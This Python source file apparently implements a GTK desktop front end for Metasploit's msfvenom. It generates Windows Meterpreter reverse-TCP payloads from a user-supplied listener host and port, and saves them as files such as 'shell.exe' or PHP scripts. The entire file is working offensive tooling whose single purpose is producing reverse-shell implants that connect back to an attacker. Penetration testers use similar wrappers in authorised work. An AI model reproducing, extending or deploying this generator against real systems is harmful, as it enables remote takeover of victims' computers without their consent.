import gi
import os
import subprocess
gi.require_version('Gtk', '3.0')
from gi.repository import Gtk


class PayloadManager:
    
    def __init__(self):
        self.payloads_dir = './payloads'
        if not os.path.exists(self.payloads_dir):
            os.mkdir(self.payloads_dir)

    def generate_payload(self, payload_type, lhost, lport, output_format, output_name):
        output_path = os.path.join(self.payloads_dir, output_name)
        
        cmd = [
            'msfvenom',
            '-p', payload_type,
            'LHOST=' + lhost,
            'LPORT=' + str(lport),
            '-f', output_format,
            '-o', output_path
        ]

        try:
            subprocess.check_output(cmd, stderr=subprocess.STDOUT)
            return output_path
        except subprocess.CalledProcessError as e:
            return str(e.output)
        

class PayloadGeneratorGUI(Gtk.Box):

    def __init__(self):
        super().__init__(spacing=10)
        self.manager = PayloadManager()
        self.init_components()

    def init_components(self):
        # Dropdown for payload selection
        self.payload_dropdown = Gtk.ComboBoxText()
        payloads = ["windows/meterpreter/reverse_tcp"]
        for payload in payloads:
            self.payload_dropdown.append_text(payload)
        self.payload_dropdown.set_active(0)

        # Entry boxes for LHOST, LPORT, and file output
        self.lhost_entry = Gtk.Entry()
        self.lhost_entry.set_placeholder_text("LHOST")
        self.lport_entry = Gtk.Entry()
        self.lport_entry.set_placeholder_text("LPORT")
        self.output_format_entry = Gtk.Entry()
        self.output_format_entry.set_placeholder_text("Output Format (e.g., exe, php)")
        self.output_name_entry = Gtk.Entry()
        self.output_name_entry.set_placeholder_text("Output Name (e.g., shell.exe)")

        # Button to generate payload
        self.generate_button = Gtk.Button(label="Generate Payload")
        self.generate_button.connect("clicked", self.generate_payload)

        # Result label
        self.result_label = Gtk.Label()

        # Pack everything into the box
        for widget in [self.payload_dropdown, self.lhost_entry, self.lport_entry, 
                       self.output_format_entry, self.output_name_entry, self.generate_button, 
                       self.result_label]:
            self.pack_start(widget, True, True, 0)

    def generate_payload(self, widget):
        payload_type = self.payload_dropdown.get_active_text()
        lhost = self.lhost_entry.get_text()
        lport = self.lport_entry.get_text()
        output_format = self.output_format_entry.get_text()
        output_name = self.output_name_entry.get_text()

        result = self.manager.generate_payload(payload_type, lhost, lport, output_format, output_name)
        self.result_label.set_text(f"Payload generated at: {result}")

if __name__ == '__main__':
    win = Gtk.Window(title="Payload Generator")
    win.connect("destroy", Gtk.main_quit)
    payload_gui = PayloadGeneratorGUI()
    win.add(payload_gui)
    win.show_all()
    Gtk.main()
